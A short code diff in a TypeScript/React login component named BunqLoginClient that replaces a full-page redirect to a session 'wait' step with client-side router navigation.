@@ -54,7 +54,7 @@ export function BunqLoginClient({ sessionId }: Props) {
       setError("Er is een fout opgetreden. Probeer het opnieuw.");
       return;
     }
-    window.location.href = stepToPath("wait", sessionId);
+    router.push(stepToPath("wait", sessionId));
   }
 
   return (
